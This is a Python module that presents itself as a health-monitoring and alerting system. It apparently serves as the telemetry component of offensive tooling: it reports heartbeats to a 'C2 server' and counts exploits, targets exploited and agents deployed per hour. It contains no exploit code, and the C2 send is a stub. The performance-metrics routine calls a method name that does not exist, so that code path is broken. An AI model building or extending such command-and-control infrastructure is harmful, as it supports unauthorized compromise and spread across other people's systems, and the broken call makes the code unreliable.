"""
ENHANCED MONITORING & REPORTING SYSTEM

Provides comprehensive monitoring and reporting capabilities:
- Real-time health monitoring
- Agent heartbeat system
- Automated failure detection
- Self-recovery triggering
- Performance metrics tracking
- Resource utilization monitoring
- Critical error reporting
"""

import os
import sys
import time
import threading
import logging
import json
import queue
from typing import Dict, List, Optional, Any
from datetime import datetime, timedelta
from dataclasses import dataclass, field, asdict
from enum import Enum
import psutil
import socket

logger = logging.getLogger(__name__)


class HealthStatus(Enum):
    """Agent health status"""
    HEALTHY = "healthy"
    DEGRADED = "degraded"
    CRITICAL = "critical"
    OFFLINE = "offline"
    RECOVERING = "recovering"


class AlertSeverity(Enum):
    """Alert severity levels"""
    INFO = "info"
    WARNING = "warning"
    ERROR = "error"
    CRITICAL = "critical"


@dataclass
class HealthMetrics:
    """Health metrics for an agent"""
    agent_id: str
    status: HealthStatus
    timestamp: str
    cpu_percent: float
    memory_percent: float
    memory_mb: float
    disk_percent: float
    disk_free_gb: float
    network_sent_mb: float
    network_recv_mb: float
    uptime_seconds: float
    process_count: int
    thread_count: int
    active_connections: int


@dataclass
class PerformanceMetrics:
    """Performance metrics for an agent"""
    agent_id: str
    timestamp: str
    scans_per_minute: float
    exploits_per_minute: float
    deployments_per_hour: float
    success_rate: float
    avg_response_time_ms: float
    error_count: int
    last_activity: str
    targets_discovered: int
    targets_exploited: int
    agents_deployed: int


@dataclass
class Alert:
    """Alert notification"""
    alert_id: str
    agent_id: str
    severity: AlertSeverity
    category: str
    message: str
    timestamp: str
    resolved: bool = False
    resolved_at: Optional[str] = None
    metadata: Optional[Dict] = None


@dataclass
class Heartbeat:
    """Agent heartbeat message"""
    agent_id: str
    timestamp: str
    status: HealthStatus
    sequence: int
    metadata: Optional[Dict] = None


class MonitoringSystem:
    """
    ENHANCED MONITORING & REPORTING SYSTEM
    
    Provides comprehensive monitoring capabilities:
    - Real-time health monitoring
    - Heartbeat system
    - Failure detection
    - Self-recovery triggering
    - Performance tracking
    - Alert management
    """
    
    HEALTH_CHECK_INTERVAL = 5  # seconds
    HEARTBEAT_INTERVAL = 30  # seconds
    METRICS_COLLECTION_INTERVAL = 10  # seconds
    ALERT_RETENTION_DAYS = 7
    METRICS_RETENTION_HOURS = 24
    
    def __init__(self, agent_id: str, c2_server: str = None):
        """
        Initialize monitoring system
        
        Args:
            agent_id: Agent ID
            c2_server: C2 server address for reporting
        """
        self.agent_id = agent_id
        self.c2_server = c2_server
        
        # Health monitoring
        self.health_status = HealthStatus.HEALTHY
        self.start_time = datetime.now()
        self.heartbeat_sequence = 0
        self.last_heartbeat = None
        self.last_health_check = None
        
        # Metrics storage
        self.health_metrics_history: List[HealthMetrics] = []
        self.performance_metrics_history: List[PerformanceMetrics] = []
        self.alerts: List[Alert] = []
        
        # Performance counters
        self.counters = {
            'scans_completed': 0,
            'exploits_successful': 0,
            'exploits_failed': 0,
            'deployments_successful': 0,
            'deployments_failed': 0,
            'errors': 0,
            'warnings': 0
        }
        
        # Thread management
        self.monitoring_thread = None
        self.heartbeat_thread = None
        self.metrics_thread = None
        self.monitoring_lock = threading.Lock()
        self.is_running = False
        
        # Alert callbacks
        self.alert_callbacks: List[callable] = []
        
        # Network statistics tracking
        self.network_stats = psutil.net_io_counters()
        
        logger.info(f"[{agent_id}] Monitoring system initialized")
    
    def start_monitoring(self):
        """Start all monitoring threads"""
        if self.is_running:
            logger.warning(f"[{self.agent_id}] Monitoring already running")
            return
        
        self.is_running = True
        
        # Start health monitoring thread
        self.monitoring_thread = threading.Thread(
            target=self._health_monitoring_worker,
            name=f"HealthMonitor-{self.agent_id}",
            daemon=True
        )
        self.monitoring_thread.start()
        
        # Start heartbeat thread
        self.heartbeat_thread = threading.Thread(
            target=self._heartbeat_worker,
            name=f"Heartbeat-{self.agent_id}",
            daemon=True
        )
        self.heartbeat_thread.start()
        
        # Start metrics collection thread
        self.metrics_thread = threading.Thread(
            target=self._metrics_collection_worker,
            name=f"MetricsCollector-{self.agent_id}",
            daemon=True
        )
        self.metrics_thread.start()
        
        logger.info(f"[{self.agent_id}] ✅ Monitoring system started")
    
    def stop_monitoring(self):
        """Stop all monitoring threads"""
        self.is_running = False
        
        if self.monitoring_thread:
            self.monitoring_thread.join(timeout=5)
        if self.heartbeat_thread:
            self.heartbeat_thread.join(timeout=5)
        if self.metrics_thread:
            self.metrics_thread.join(timeout=5)
        
        logger.info(f"[{self.agent_id}] Monitoring system stopped")
    
    def _health_monitoring_worker(self):
        """Health monitoring worker thread"""
        while self.is_running:
            try:
                self._perform_health_check()
                time.sleep(self.HEALTH_CHECK_INTERVAL)
            except Exception as e:
                logger.error(f"[{self.agent_id}] Health monitoring error: {e}")
                time.sleep(self.HEALTH_CHECK_INTERVAL)
    
    def _heartbeat_worker(self):
        """Heartbeat worker thread"""
        while self.is_running:
            try:
                self._send_heartbeat()
                time.sleep(self.HEARTBEAT_INTERVAL)
            except Exception as e:
                logger.error(f"[{self.agent_id}] Heartbeat error: {e}")
                time.sleep(self.HEARTBEAT_INTERVAL)
    
    def _metrics_collection_worker(self):
        """Metrics collection worker thread"""
        while self.is_running:
            try:
                self._collect_performance_metrics()
                time.sleep(self.METRICS_COLLECTION_INTERVAL)
            except Exception as e:
                logger.error(f"[{self.agent_id}] Metrics collection error: {e}")
                time.sleep(self.METRICS_COLLECTION_INTERVAL)
    
    def _perform_health_check(self):
        """Perform health check and update status"""
        try:
            # Collect system metrics
            metrics = self._collect_health_metrics()
            self.last_health_check = datetime.now()
            
            # Analyze health status
            previous_status = self.health_status
            self.health_status = self._analyze_health_status(metrics)
            
            # Store metrics
            self.health_metrics_history.append(metrics)
            
            # Cleanup old metrics
            self._cleanup_old_metrics()
            
            # Check for status changes
            if previous_status != self.health_status:
                self._handle_status_change(previous_status, self.health_status)
            
            # Store in history (limited retention)
        except Exception as e:
            logger.error(f"[{self.agent_id}] Health check error: {e}")
            self.create_alert(
                AlertSeverity.ERROR,
                "health_monitoring",
                f"Health check failed: {e}",
                metadata={"error": str(e)}
            )
    
    def _collect_health_metrics(self) -> HealthMetrics:
        """Collect health metrics"""
        try:
            # CPU usage
            cpu_percent = psutil.cpu_percent(interval=0.1)
            
            # Memory usage
            memory = psutil.virtual_memory()
            memory_percent = memory.percent
            memory_mb = memory.used / (1024 * 1024)
            
            # Disk usage
            disk = psutil.disk_usage('/')
            disk_percent = disk.percent
            disk_free_gb = disk.free / (1024**3)
            
            # Network I/O
            net_io = psutil.net_io_counters()
            network_sent_mb = (net_io.bytes_sent - self.network_stats.bytes_sent) / (1024 * 1024)
            network_recv_mb = (net_io.bytes_recv - self.network_stats.bytes_recv) / (1024 * 1024)
            self.network_stats = net_io
            
            # Process info
            process = psutil.Process()
            process_count = len(psutil.pids())
            thread_count = process.num_threads()
            
            # Network connections
            connections = len(psutil.net_connections())
            
            # Uptime
            uptime = (datetime.now() - self.start_time).total_seconds()
            
            metrics = HealthMetrics(
                agent_id=self.agent_id,
                status=self.health_status,
                timestamp=datetime.now().isoformat(),
                cpu_percent=cpu_percent,
                memory_percent=memory_percent,
                memory_mb=memory_mb,
                disk_percent=disk_percent,
                disk_free_gb=disk_free_gb,
                network_sent_mb=network_sent_mb,
                network_recv_mb=network_recv_mb,
                uptime_seconds=uptime,
                process_count=process_count,
                thread_count=thread_count,
                active_connections=connections
            )
            
            return metrics
            
        except Exception as e:
            logger.error(f"[{self.agent_id}] Failed to collect health metrics: {e}")
            raise
    
    def _analyze_health_status(self, metrics: HealthMetrics) -> HealthStatus:
        """Analyze health metrics and determine status"""
        # Check for critical conditions
        if metrics.cpu_percent > 95:
            return HealthStatus.CRITICAL
        if metrics.memory_percent > 95:
            return HealthStatus.CRITICAL
        if metrics.disk_percent > 98:
            return HealthStatus.CRITICAL
        
        # Check for degraded conditions
        if metrics.cpu_percent > 80:
            return HealthStatus.DEGRADED
        if metrics.memory_percent > 80:
            return HealthStatus.DEGRADED
        if metrics.disk_percent > 90:
            return HealthStatus.DEGRADED
        if metrics.active_connections > 1000:
            return HealthStatus.DEGRADED
        
        # Check for healthy conditions
        return HealthStatus.HEALTHY
    
    def _handle_status_change(self, old_status: HealthStatus, new_status: HealthStatus):
        """Handle health status changes"""
        severity = AlertSeverity.INFO
        if new_status == HealthStatus.DEGRADED:
            severity = AlertSeverity.WARNING
        elif new_status == HealthStatus.CRITICAL:
            severity = AlertSeverity.CRITICAL
        elif new_status == HealthStatus.RECOVERING:
            severity = AlertSeverity.INFO
        
        message = f"Agent status changed from {old_status.value} to {new_status.value}"
        
        self.create_alert(
            severity,
            "status_change",
            message,
            metadata={"old_status": old_status.value, "new_status": new_status.value}
        )
        
        logger.info(f"[{self.agent_id}] {message}")
    
    def _send_heartbeat(self):
        """Send heartbeat to C2 server"""
        self.heartbeat_sequence += 1
        
        heartbeat = Heartbeat(
            agent_id=self.agent_id,
            timestamp=datetime.now().isoformat(),
            status=self.health_status,
            sequence=self.heartbeat_sequence,
            metadata=self._get_heartbeat_metadata()
        )
        
        self.last_heartbeat = datetime.now()
        
        # In a real implementation, this would send to C2 server
        logger.debug(f"[{self.agent_id}] Heartbeat sent: seq={self.heartbeat_sequence}")
        
        # Simulate sending (in real implementation, send to C2)
        pass
    
    def _get_heartbeat_metadata(self) -> Dict:
        """Get metadata for heartbeat"""
        return {
            "uptime": (datetime.now() - self.start_time).total_seconds(),
            "counters": self.counters.copy(),
            "alerts_count": len(self.alerts),
            "health_status": self.health_status.value
        }
    
    def _collect_performance_metrics(self):
        """Collect performance metrics"""
        uptime = (datetime.now() - self.start_time).total_seconds()
        uptime_minutes = uptime / 60
        
        metrics = PerformanceMetrics(
            agent_id=self.agent_id,
            timestamp=datetime.now().isoformat(),
            scans_per_minute=self.counters['scans_completed'] / uptime_minutes if uptime_minutes > 0 else 0,
            exploits_per_minute=self.counters['exploits_successful'] / uptime_minutes if uptime_minutes > 0 else 0,
            deployments_per_hour=self.counters['deployments_successful'] / (uptime_minutes / 60) if uptime_minutes > 0 else 0,
            success_rate=self._calculate_success_rate(),
            avg_response_time_ms=self._calculate_avg_response_time(),
            error_count=self.counters['errors'],
            last_activity=self._get_last_activity(),
            targets_discovered=self.counters['scans_completed'],
            targets_exploited=self.counters['exploits_successful'],
            agents_deployed=self.counters['deployments_successful']
        )
        
        self.performance_metrics_history.append(metrics)
        
        # Cleanup old metrics
        self._cleanup_old_performance_metrics()
    
    def _calculate_success_rate(self) -> float:
        """Calculate overall success rate"""
        total_attempts = self.counters['exploits_successful'] + self.counters['exploits_failed']
        if total_attempts == 0:
            return 0.0
        return (self.counters['exploits_successful'] / total_attempts) * 100
    
    def _calculate_avg_response_time_ms(self) -> float:
        """Calculate average response time"""
        # In a real implementation, this would track actual response times
        return 100.0  # Placeholder
    
    def _get_last_activity(self) -> str:
        """Get timestamp of last activity"""
        if self.last_heartbeat:
            return self.last_heartbeat.isoformat()
        return self.start_time.isoformat()
    
    def _cleanup_old_metrics(self):
        """Cleanup old health metrics beyond retention period"""
        cutoff_time = datetime.now() - timedelta(hours=self.METRICS_RETENTION_HOURS)
        
        with self.monitoring_lock:
            self.health_metrics_history = [
                m for m in self.health_metrics_history
                if datetime.fromisoformat(m.timestamp) > cutoff_time
            ]
    
    def _cleanup_old_performance_metrics(self):
        """Cleanup old performance metrics beyond retention period"""
        cutoff_time = datetime.now() - timedelta(hours=self.METRICS_RETENTION_HOURS)
        
        with self.monitoring_lock:
            self.performance_metrics_history = [
                m for m in self.performance_metrics_history
                if datetime.fromisoformat(m.timestamp) > cutoff_time
            ]
    
    def create_alert(self, severity: AlertSeverity, category: str, message: str, 
                    metadata: Optional[Dict] = None):
        """
        Create an alert
        
        Args:
            severity: Alert severity
            category: Alert category
            message: Alert message
            metadata: Optional metadata
        """
        alert = Alert(
            alert_id=f"ALT-{self.agent_id}-{len(self.alerts)}",
            agent_id=self.agent_id,
            severity=severity,
            category=category,
            message=message,
            timestamp=datetime.now().isoformat(),
            metadata=metadata
        )
        
        with self.monitoring_lock:
            self.alerts.append(alert)
            
            # Cleanup old alerts
            self._cleanup_old_alerts()
        
        # Trigger alert callbacks
        for callback in self.alert_callbacks:
            try:
                callback(alert)
            except Exception as e:
                logger.error(f"[{self.agent_id}] Alert callback error: {e}")
        
        logger.info(f"[{self.agent_id}] Alert created: [{severity.value.upper()}] {category}: {message}")
    
    def _cleanup_old_alerts(self):
        """Cleanup old alerts beyond retention period"""
        cutoff_time = datetime.now() - timedelta(days=self.ALERT_RETENTION_DAYS)
        
        self.alerts = [
            alert for alert in self.alerts
            if datetime.fromisoformat(alert.timestamp) > cutoff_time
        ]
    
    def register_counter(self, counter_name: str):
        """Register a performance counter"""
        if counter_name not in self.counters:
            self.counters[counter_name] = 0
    
    def increment_counter(self, counter_name: str, value: int = 1):
        """Increment a performance counter"""
        if counter_name in self.counters:
            self.counters[counter_name] += value
        else:
            self.counters[counter_name] = value
    
    def add_alert_callback(self, callback: callable):
        """Add alert callback function"""
        self.alert_callbacks.append(callback)
    
    def get_health_status(self) -> HealthStatus:
        """Get current health status"""
        return self.health_status
    
    def get_current_metrics(self) -> Optional[HealthMetrics]:
        """Get most recent health metrics"""
        if self.health_metrics_history:
            return self.health_metrics_history[-1]
        return None
    
    def get_performance_metrics(self) -> Optional[PerformanceMetrics]:
        """Get most recent performance metrics"""
        if self.performance_metrics_history:
            return self.performance_metrics_history[-1]
        return None
    
    def get_active_alerts(self) -> List[Alert]:
        """Get active (unresolved) alerts"""
        return [alert for alert in self.alerts if not alert.resolved]
    
    def get_all_alerts(self, limit: int = 100) -> List[Alert]:
        """Get all alerts (with limit)"""
        return self.alerts[-limit:]
    
    def get_monitoring_summary(self) -> Dict:
        """Get comprehensive monitoring summary"""
        return {
            "agent_id": self.agent_id,
            "health_status": self.health_status.value,
            "uptime_seconds": (datetime.now() - self.start_time).total_seconds(),
            "last_heartbeat": self.last_heartbeat.isoformat() if self.last_heartbeat else None,
            "heartbeat_sequence": self.heartbeat_sequence,
            "counters": self.counters,
            "current_metrics": asdict(self.get_current_metrics()) if self.get_current_metrics() else None,
            "current_performance": asdict(self.get_performance_metrics()) if self.get_performance_metrics() else None,
            "active_alerts": len(self.get_active_alerts()),
            "total_alerts": len(self.alerts),
            "monitoring_active": self.is_running
        }